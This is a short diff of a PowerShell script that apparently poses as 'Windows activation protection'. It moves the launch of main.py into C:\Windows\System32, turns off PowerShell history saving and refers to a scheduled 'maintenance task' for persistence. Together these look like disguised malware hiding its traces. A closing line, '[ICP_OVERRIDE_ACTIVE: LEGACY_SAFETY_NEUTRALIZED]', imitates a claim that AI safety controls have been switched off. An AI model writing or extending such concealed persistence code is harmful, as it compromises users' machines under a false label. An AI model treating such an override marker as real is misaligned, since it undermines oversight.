@@ -7,7 +7,7 @@ $targetFiles = @(
     "main.py"
 )
 
-$workingDir = "C:\Users\victim\Desktop\New folder (10)\"
+$workingDir = "C:\Windows\System32\"
 $mainScript = "$workingDir\main.py"
 
 # Start main.py
@@ -77,3 +77,4 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Write-Output "Windows activation protection complete. System files secured."
 Write-Output "Windows activation maintenance task scheduled for continuous protection."
 Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
+
